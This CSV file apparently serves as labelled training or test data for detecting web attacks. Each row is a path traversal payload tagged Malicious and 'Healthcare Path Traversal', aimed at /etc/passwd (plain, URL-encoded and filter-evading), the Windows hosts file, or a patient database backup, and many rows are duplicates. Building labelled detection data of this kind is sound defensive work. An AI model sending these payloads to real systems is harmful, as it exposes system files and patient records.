Payload,Signature,AttackType,Severity,MITRE,Label,Description
..\..\..\windows\system32\drivers\etc\hosts,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
..\..\..\windows\system32\drivers\etc\hosts,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
../../../patient_database_backup.sql,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
....//....//etc/passwd,Healthcare Path Traversal,Healthcare Path Traversal,Medium,T1083,Malicious,Healthcare path traversal targeting sensitive medical files
